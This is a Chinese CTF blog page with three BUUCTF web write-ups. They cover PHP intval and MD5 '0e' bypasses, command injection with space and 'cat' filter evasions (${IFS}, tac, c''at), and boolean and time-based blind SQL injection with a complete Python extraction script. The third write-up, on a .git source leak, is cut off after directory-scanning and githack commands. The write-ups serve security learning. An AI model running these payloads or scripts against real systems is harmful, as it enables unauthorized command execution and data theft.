<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-WUSTCTF2020-朴实无华1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/10/05/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E1/" class="article-date">
  <time class="dt-published" datetime="2025-10-05T11:50:49.000Z" itemprop="datePublished">2025-10-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/10/05/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E1/">[WUSTCTF2020]朴实无华1</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>上来先使用工具dirsearch扫目录</p>
<p>D:\python\dirsearch-master&gt;dirsearch -e txt,bak,zip,tgz -u <a target="_blank" rel="noopener" href="http://50370053-0d9a-4135-8e46-74ad1f294852.node5.buuoj.cn:81/">http://50370053-0d9a-4135-8e46-74ad1f294852.node5.buuoj.cn:81/</a> -t 5 –delay 1</p>
<p>[17:24:02] 200 -   227B - &#x2F;index.php<br>[17:24:03] 200 -   227B - &#x2F;index.php&#x2F;login&#x2F;<br>[17:34:47] 200 -    44B - &#x2F;robots.txt</p>
<p>在&#x2F;robots.txt发现:</p>
<p>User-agent: *<br>Disallow: &#x2F;fAke_f1agggg.php</p>
<p>于是访问 &#x2F;fAke_f1agggg.php目录</p>
<p>给出了一个假的flag  flag{this_is_not_flag}</p>
<p>抓包看看</p>
<p>HTTP&#x2F;1.1 200 OK<br>Server: openresty<br>Date: Sun, 05 Oct 2025 10:09:23 GMT<br>Content-Type: text&#x2F;html<br>Content-Length: 22<br>Connection: keep-alive<br>X-Powered-By: PHP&#x2F;5.5.38<br>look_at_me: &#x2F;fl4g.php<br>Cache-Control: no-cache</p>
<p>flag{this_is_not_flag}</p>
<p>关键点在  look_at_me: &#x2F;fl4g.php</p>
<p>访问这个目录</p>
<p>得到源码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); <span class="title function_ invoke__">highlight_file</span>(__file__);  </span><br><span class="line"><span class="comment">//level 1 </span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;  </span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];   </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;     </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;    </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);   </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;   <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>); </span><br><span class="line">     &#125; </span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;  </span><br><span class="line">    <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]; </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$md5</span>==<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>))  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>; </span><br><span class="line">    <span class="keyword">else</span>    <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;   </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//get flag </span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;  </span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];   </span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;   </span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);   </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;     <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;   </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>



<p>这段代码有三个绕过:</p>
<h3 id="第一个"><a href="#第一个" class="headerlink" title="第一个:"></a>第一个:</h3><p>if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)</p>
<p>intval()函数是将指定数值转换为整数,</p>
<h5 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h5><ul>
<li><code>intval()</code> 对 <code>null</code> 转换结果为 <code>0</code></li>
<li>对于非数字开头的字符串（如 <code>&quot;abc123&quot;</code>），结果为 <code>0</code></li>
<li>与 <code>floatval()</code>、<code>strval()</code> 配合可实现不同类型间的灵活转换</li>
</ul>
<h6 id="关键点："><a href="#关键点：" class="headerlink" title="关键点："></a>关键点：</h6><ul>
<li><p><code>intval($num)</code> 会严格按照字符串解析，遇到非数字字符停止</p>
</li>
<li><p><code>$num + 1</code> 会先将 <code>$num</code> 进行<strong>数学转换</strong>，然后再加 1，最后 <code>intval()</code> 取整</p>
<p>num&#x3D;1e4的时候,intval(1e4)&#x3D;1,intval(1e4+1)&#x3D;intval(1001)&#x3D;1001</p>
<p>满足绕过条件</p>
<p>payload:num&#x3D;1e4</p>
<h3 id="第二个"><a href="#第二个" class="headerlink" title="第二个:"></a>第二个:</h3><p>if (isset($_GET[‘md5’])){<br>$md5&#x3D;$_GET[‘md5’];<br>if ($md5&#x3D;&#x3D;md5($md5))</p>
</li>
</ul>
<p>在 PHP 中，MD5 哈希值的 “弱等于比较”（使用 <code>==</code> 运算符）存在安全漏洞，这是由 PHP 的弱类型转换机制导致的。</p>
<h5 id="核心原理"><a href="#核心原理" class="headerlink" title="核心原理"></a>核心原理</h5><p>当使用 <code>==</code> 比较两个字符串时，PHP 会尝试将它们转换为相同类型后再比较。如果字符串以 <code>0e</code> 开头且后续字符全是数字，PHP 会将其解析为科学计数法 <code>0 × 10^n</code>（结果为 0）。</p>
<p>因此，两个不同的字符串，只要它们的 MD5 哈希值都符合 <code>0e[0-9]+</code> 格式，就会被 <code>==</code> 判断为相等。</p>
<h5 id="完全符合要求的（字符串本身-0e…，MD5-也是-0e…）"><a href="#完全符合要求的（字符串本身-0e…，MD5-也是-0e…）" class="headerlink" title="完全符合要求的（字符串本身 0e…，MD5 也是 0e…）"></a>完全符合要求的（字符串本身 0e…，MD5 也是 0e…）</h5><p>php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;0e215962017&quot; → &quot;0e291242476940776845150308577824&quot;</span><br></pre></td></tr></table></figure>



<p>php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;0e1137126905&quot; → &quot;0e291659922323405260514745084877&quot;</span><br></pre></td></tr></table></figure>



<p>php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;0e665070199&quot; → &quot;0e220288161793147917283599844203&quot;  </span><br></pre></td></tr></table></figure>

<p>payload为md5&#x3D;0e665070199</p>
<h3 id="第三个"><a href="#第三个" class="headerlink" title="第三个:"></a>第三个:</h3><p>if (isset($_GET[‘get_flag’])){<br>    $get_flag &#x3D; $_GET[‘get_flag’];<br>    if(!strstr($get_flag,” “)){<br>        $get_flag &#x3D; str_ireplace(“cat”, “wctf2020”, $get_flag);   </p>
<p>这是一个<strong>命令注入过滤绕过</strong>的场景。代码做了以下限制：</p>
<ol>
<li><strong>不能包含空格</strong>：<code>!strstr($get_flag,&quot; &quot;)</code></li>
<li>**把 “cat” 替换成 “wctf2020”**：<code>str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag)</code></li>
</ol>
<h4 id="1-绕过思路"><a href="#1-绕过思路" class="headerlink" title="1. 绕过思路"></a>1. 绕过思路</h4><h5 id="1-1-空格替代"><a href="#1-1-空格替代" class="headerlink" title="1.1 空格替代"></a>1.1 空格替代</h5><p>不能用空格，但可以用其他空白符：</p>
<ul>
<li><p><strong><code>$&#123;IFS&#125;</code></strong> （最常用）</p>
</li>
<li><p><strong><code>$IFS$9</code></strong></p>
</li>
<li><p><strong><code>&lt;</code></strong> 重定向符号</p>
</li>
<li><p><strong><code>%09</code></strong> （Tab）</p>
</li>
<li><p><strong><code>&#123;cmd,argument&#125;</code></strong> 花括号扩展</p>
<h5 id="1-2-“cat”-过滤绕过"><a href="#1-2-“cat”-过滤绕过" class="headerlink" title="1.2 “cat” 过滤绕过"></a>1.2 “cat” 过滤绕过</h5><ul>
<li><strong>使用其他命令</strong>：<code>tac</code>、<code>more</code>、<code>less</code>、<code>head</code>、<code>tail</code>、<code>nl</code>、<code>awk</code>、<code>sed</code></li>
<li><strong>字符串拼接</strong>：<code>c&#39;&#39;at</code>、<code>c\at</code>、<code>ca$@t</code>、<code>c$a&#123;t</code></li>
<li><strong>编码&#x2F;转义</strong>：<code>c\at</code>、<code>cat$*</code></li>
<li><strong>使用绝对路径</strong>：<code>/bin/cat</code></li>
</ul>
</li>
</ul>
<p>我们先使用ls命令即<a target="_blank" rel="noopener" href="http://2f271f59-a883-47a2-8857-cfbfb60c72e9.node5.buuoj.cn:81/fl4g.php/?num=1e4&md5=0e215962017&get_flag=ls">http://2f271f59-a883-47a2-8857-cfbfb60c72e9.node5.buuoj.cn:81/fl4g.php/?num=1e4&amp;md5=0e215962017&amp;get_flag=ls</a></p>
<p>得到:</p>
<p>404.html fAke_f1agggg.php fl4g.php fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag img.jpg index.php robots.txt</p>
<p>最终payload</p>
<p><a target="_blank" rel="noopener" href="http://2f271f59-a883-47a2-8857-cfbfb60c72e9.node5.buuoj.cn:81/fl4g.php/?num=1e4&md5=0e215962017&get_flag=more%3Cfllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag">http://2f271f59-a883-47a2-8857-cfbfb60c72e9.node5.buuoj.cn:81/fl4g.php/?num=1e4&amp;md5=0e215962017&amp;get_flag=more%3Cfllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</a></p>
<p>获得flag</p>
<p>flag{af5950d4-f464-4dbe-9ad3-981d4d14d6f9}</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/10/05/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E1/" data-id="cmgdn5uqi0000d0uyebpb1ld3" data-title="[WUSTCTF2020]朴实无华1" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-BUUCTF-CISCN2019-华北赛区-Day2-Web1-Hack-World-1-SQL注入之布尔盲注）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/10/04/BUUCTF-CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World-1-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%89/" class="article-date">
  <time class="dt-published" datetime="2025-10-04T12:59:21.000Z" itemprop="datePublished">2025-10-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/10/04/BUUCTF-CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World-1-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%89/">BUUCTF [CISCN2019 华北赛区 Day2 Web1]Hack World 1(SQL注入之布尔盲注）</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251004195824712.png" alt="image-20251004195824712"></p>
<p>看到登录框先测试一波</p>
<p>输入0:</p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251004195933121.png" alt="image-20251004195933121"></p>
<p>输入1:</p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251004195952145.png" alt="image-20251004195952145"></p>
<p>输入2 :</p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251004200001588.png"></p>
<p>输入3,经过观察输入3以后的数字和输入3回显一样的结果</p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251004200015752.png" alt="image-20251004200015752"></p>
<p>测试一下有没有注入点</p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251004200141728.png" alt="image-20251004200141728"></p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251004200144764.png" alt="image-20251004200144764"></p>
<p>多次测试其他字符闭合发现都是一样的回显</p>
<p>+号被过滤</p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251004200552269.png"></p>
<p>报错注入被禁了</p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251004201302877.png" alt="image-20251004201302877"></p>
<p>联合注入也被禁了</p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251004200858637.png" alt="image-20251004200858637"></p>
<p>于是乎想到了盲注,盲注又分为时间盲注和布尔盲注</p>
<p>先看看时间盲注:</p>
<p>由于题目已经提示了flag在哪里</p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251004201754955.png" alt="image-20251004201754955"></p>
<p>所以直接构造payload,因为一般flag的形式是flag{},所以先通过第一位去测试一下payload准确性if((substr((select(flag)from(flag)),1,1)&#x3D;’f’),sleep(3),sleep(1))</p>
<p>经测试是延缓了三秒,payload无误</p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251004202533729.png" alt="image-20251004202533729"></p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251004202757777.png" alt="image-20251004202757777"></p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251004202801873.png" alt="image-20251004202801873"></p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251004202806066.png" alt="image-20251004202806066"></p>
<p>结果爆破出来了但是发现有些不完整而且有些缺漏的</p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251004203715064.png" alt="image-20251004203715064"></p>
<p>布尔盲注</p>
<p>通过测试得到,当id&#x3D;0时回显</p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251004202929546.png" alt="image-20251004202929546"></p>
<p>当id&#x3D;1时回显</p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251004202944867.png" alt="image-20251004202944867"></p>
<p>所以构造payload:id&#x3D;(ascii(substr((select(flag)from(flag)),1,1))&#x3D;102)</p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251004203542781.png" alt="image-20251004203542781"></p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251004204000318.png" alt="image-20251004204000318"></p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251004204004207.png" alt="image-20251004204004207"></p>
<p>从爆破结果很难找到payload虽然这个办法可行但是太繁琐</p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251004204153200.png" alt="image-20251004204153200"></p>
<p>于是直接上脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">#调用请求模块</span><br><span class="line">import time</span><br><span class="line">#调用时间模块</span><br><span class="line">import re</span><br><span class="line">#调用规则表达式模块</span><br><span class="line">url=&#x27;http://9df6e541-c4c8-4336-90d2-8db038e352ef.node5.buuoj.cn:81/&#x27;</span><br><span class="line">#题目链接</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">#创建一个变量用来存放flag值</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    #for循环遍历，i表示flag值大致长度是50以内</span><br><span class="line">    max = 127</span><br><span class="line">    #赋值127</span><br><span class="line">    min = 0</span><br><span class="line">    #赋值0</span><br><span class="line">    for c in range(0,127):</span><br><span class="line">        #for循环遍历</span><br><span class="line">        s = (int)((max+min)/2)</span><br><span class="line">        #首先将 max 和 min 相加，然后除以 2，最后将结果强制转换为整数类型。</span><br><span class="line">        payload = &#x27;1^(ascii(substr((select(flag)from(flag)),&#x27;+str(i)+&#x27;,1))&gt;&#x27;+str(s)+&#x27;)&#x27;</span><br><span class="line">        #^异或运算符，相同为假，不相同为真，1^payload，若为payload结果为假，则返回0，1^0=1，将得到查询id=1时的结果，回显Hello, glzjin wants a girlfriend。</span><br><span class="line">        #从flag数据表中选择一个名为flag的字段，然后取这个字段的字符串（从位置 &#x27;+str(i)+&#x27; 开始，长度为 1（每次只返回一个））</span><br><span class="line">        #将这个字符串转换为 ASCII 码，然后判断这个 ASCII 码是否大于一个名为 &quot;s&quot; 的变量。</span><br><span class="line">        r = requests.post(url,data = &#123;&#x27;id&#x27;:payload&#125;)</span><br><span class="line">        #requests模块的运用，将payload赋值给题目中这个名为id的参数</span><br><span class="line">        time.sleep(0.005)</span><br><span class="line">        #每循环一次休眠0.005秒</span><br><span class="line">        if &#x27;Hello&#x27; in str(r.content):</span><br><span class="line">            #如果Hello这个字符串在生成的结果中，那么就继续向下进行</span><br><span class="line">            max=s</span><br><span class="line">        #将s的值赋值给max</span><br><span class="line">        else:</span><br><span class="line">            #反之</span><br><span class="line">            min=s</span><br><span class="line">        #将s的值赋值给min</span><br><span class="line">        if((max-min)&lt;=1):</span><br><span class="line">            #如果max-min的值</span><br><span class="line">            flag+=chr(max)</span><br><span class="line">            #将max的ASCII值转化为字符串</span><br><span class="line">            print(flag)</span><br><span class="line">            #输出flag</span><br><span class="line">            break</span><br><span class="line">            #跳出循环</span><br></pre></td></tr></table></figure>

<p>得出flag</p>
<p>f<br>fl<br>fla<br>flag<br>flag{<br>flag{5<br>flag{5c<br>flag{5c2<br>flag{5c2a<br>flag{5c2aa<br>flag{5c2aaa<br>flag{5c2aaaf<br>flag{5c2aaafc<br>flag{5c2aaafc-<br>flag{5c2aaafc-b<br>flag{5c2aaafc-b7<br>flag{5c2aaafc-b7a<br>flag{5c2aaafc-b7a1<br>flag{5c2aaafc-b7a1-<br>flag{5c2aaafc-b7a1-4<br>flag{5c2aaafc-b7a1-49<br>flag{5c2aaafc-b7a1-49b<br>flag{5c2aaafc-b7a1-49b9<br>flag{5c2aaafc-b7a1-49b9-<br>flag{5c2aaafc-b7a1-49b9-8<br>flag{5c2aaafc-b7a1-49b9-83<br>flag{5c2aaafc-b7a1-49b9-83c<br>flag{5c2aaafc-b7a1-49b9-83cf<br>flag{5c2aaafc-b7a1-49b9-83cf-<br>flag{5c2aaafc-b7a1-49b9-83cf-5<br>flag{5c2aaafc-b7a1-49b9-83cf-51<br>flag{5c2aaafc-b7a1-49b9-83cf-51b<br>flag{5c2aaafc-b7a1-49b9-83cf-51b6<br>flag{5c2aaafc-b7a1-49b9-83cf-51b65<br>flag{5c2aaafc-b7a1-49b9-83cf-51b65c<br>flag{5c2aaafc-b7a1-49b9-83cf-51b65c2<br>flag{5c2aaafc-b7a1-49b9-83cf-51b65c2c<br>flag{5c2aaafc-b7a1-49b9-83cf-51b65c2c2<br>flag{5c2aaafc-b7a1-49b9-83cf-51b65c2c25<br>flag{5c2aaafc-b7a1-49b9-83cf-51b65c2c259<br>flag{5c2aaafc-b7a1-49b9-83cf-51b65c2c2596<br>flag{5c2aaafc-b7a1-49b9-83cf-51b65c2c2596}</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/10/04/BUUCTF-CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World-1-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%89/" data-id="cmgca6mu00000tkuyh75je3su" data-title="BUUCTF [CISCN2019 华北赛区 Day2 Web1]Hack World 1(SQL注入之布尔盲注）" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-BJDCTF2020-Mark-loves-cat1-三种解法" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/10/03/BJDCTF2020-Mark-loves-cat1-%E4%B8%89%E7%A7%8D%E8%A7%A3%E6%B3%95/" class="article-date">
  <time class="dt-published" datetime="2025-10-03T02:34:29.000Z" itemprop="datePublished">2025-10-03</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/10/03/BJDCTF2020-Mark-loves-cat1-%E4%B8%89%E7%A7%8D%E8%A7%A3%E6%B3%95/">[BJDCTF2020]Mark loves cat1--三种解法</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>1.刚打开之后是这样画面,往下翻有更多的页面,感觉海挺高级</p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251003093042140.png" alt="image-20251003093042140"></p>
<p>2.翻到下面的blog发现有输入框</p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251003093235071.png" alt="image-20251003093235071"></p>
<p>3.随便输入几个数字测试一下</p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251003093321441.png" alt="image-20251003093321441"></p>
<p>4.它直接跳转到了主页面,但是内容还是没有改变成我输入的东西</p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251003093439373.png" alt="image-20251003093439373"></p>
<p>5测试一下这里是否存在sql注入或者xss漏洞</p>
<p>并未发现sql注入点</p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251003093715769.png" alt="image-20251003093715769"></p>
<p>经测试发现并不存在xss漏洞</p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251003094049992.png" alt="image-20251003094049992"></p>
<p>6.用dirsearch扫一下目录</p>
<p>输入:python dirsearch.py -u <a target="_blank" rel="noopener" href="http://88c32730-ec08-404b-bacf-03c4a70a716d.node5.buuoj.cn:81/">http://88c32730-ec08-404b-bacf-03c4a70a716d.node5.buuoj.cn:81/</a> -t 5 -d 1 -H “User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko&#x2F;20100101 Firefox&#x2F;143.0”<br>这里我输入了浏览器UA头,从而避免识别为爬虫</p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251003094124655.png" alt="image-20251003094124655"></p>
<p>观察可知,这里可能存在git泄露,直接上工具用githack获取源码</p>
<p>python githack.py <a target="_blank" rel="noopener" href="http://88c32730-ec08-404b-bacf-03c4a70a716d.node5.buuoj.cn/.git/">http://88c32730-ec08-404b-bacf-03c4a70a716d.node5.buuoj.cn/.git/</a></p>
